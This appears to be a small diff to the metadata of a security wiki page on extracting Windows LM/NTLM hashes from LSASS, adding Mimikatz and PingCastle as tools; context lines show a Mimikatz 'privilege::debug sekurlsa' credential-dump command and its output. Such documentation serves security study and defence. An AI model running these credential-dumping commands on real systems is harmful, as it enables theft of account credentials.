@@ -38,6 +38,9 @@ output: "C:\\Users\\BOB\\Desktop>mimikatz.exe \"privilege::debug\" \"sekurlsa::l
   \ hunter2\n...\n...\n\nmimikatz(commandline) # exit\nBye!\n"
 created_at: '2019-09-27T21:15:40.389492+00:00'
 updated_at: '2023-05-29T16:48:52.884824+00:00'
+tools:
+- '[[Mimikatz]]'
+- '[[PingCastle]]'
 ---
 
 # Extract Windows LM/NTLM Hashes From LSASS
